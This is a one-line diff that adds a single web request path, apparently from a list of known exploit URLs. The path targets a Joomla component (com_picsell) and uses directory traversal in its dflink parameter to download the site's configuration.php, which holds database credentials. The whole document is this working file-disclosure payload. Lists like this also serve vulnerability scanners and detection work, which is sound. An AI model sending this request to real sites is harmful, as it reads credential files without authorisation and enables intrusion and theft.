@@ -1,0 +1,1 @@
+/index.php?option=com_picsell&controller=prevsell&task=dwnfree&dflink=../../../configuration.php
